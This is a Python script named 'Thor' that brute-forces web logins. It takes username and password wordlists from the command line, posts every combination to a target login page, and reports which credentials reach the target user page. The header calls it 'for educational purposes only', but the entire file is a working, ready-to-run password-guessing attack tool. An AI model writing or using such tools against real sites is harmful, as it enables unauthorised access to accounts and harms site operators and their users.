#!/usr/bin/python
# -*- coding: utf-8 -*-
#======================================================
#THIS SCRIPT IS WRITTEN BY BOCIAN67 AND IS JUST FOR
#EDUCATIONAL PURPOSES ONLY!     ~Thor_will_win~
#======================================================
from requests import session
import os
from pathlib import Path
import optparse
User = []
Pass = []

def appendtarget(tfile, tlist):
    try:
        files = open(tfile, 'r')
        for line in files.readlines():
            line = line.strip('\n')
            tlist.append(line)
    except:
        pass

def login(username,password,taruser,tarlog):
        payload = {
            "action" : "login",
            "username" : username,
            "password" : password
        }
        with session() as c:
            c.post(tarlog, data=payload)
            response = c.get(taruser)
            content_length = response.headers["content-length"]
            status = response.status_code
            print("URL: "   +response.url+"\nUser: "+username+\
            "\nPass: "+password+"\ncontent_length: "+str(content_length)\
            +"\n"+str(status))
            if (response.url == taruser):
                print "[+] Found Username: "+username+\
                "\n    with Password: "+password
                exit(0)
            else:
                print ("[-] Username or Password is wrong!")

def main():
    userf = []
    passf = []
    parser = optparse.OptionParser('Thor for education: '\
    +'--TL <Target Login Page> --TU <Target User Page \
    --UF <Username File> --U <Username> --PF <Passfile> --P <Password>')
    parser.add_option('--TL',dest='tarlog',type='string',\
    help='Target Login Page angeben')
    parser.add_option('--TU',dest='taruser',type='string',\
    help='Target User Page angeben')
    parser.add_option('--UF',dest='userf',type='string',\
    help='Username File angeben')
    parser.add_option('--U',dest='usern',type='string',\
    help='Username angeben')
    parser.add_option('--PF',dest='passf',type='string',\
    help='Passfile angeben')
    parser.add_option('--P',dest='passwd',type='string',\
    help='Password angeben')

    (options, args) = parser.parse_args()
    tarlog = options.tarlog
    taruser = options.taruser
    appendtarget(options.userf, userf)
    usern = options.usern
    appendtarget(options.passf, passf)
    passwd = options.passwd


    if ((tarlog == None) & (taruser == None)):
        print parser.usage
        exit(0)
    elif ((userf == None) & (usern == None)):
        print parser.usage
        exit(0)
    elif ((passf == None) & (passwd == None)):
        print parser.usage
        exit(0)
    try:
        if usern:
            if passwd:
                login(usern, passwd,taruser,tarlog)
            elif passf:
                for passw in passf:
                    login(usern, passw,taruser,tarlog)
        elif userf:
            for user in userf:
                if passwd:
                    login(user, passwd,taruser,tarlog)
                elif passf:
                    for passw in passf:
                        login(user, passw,taruser,tarlog)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()
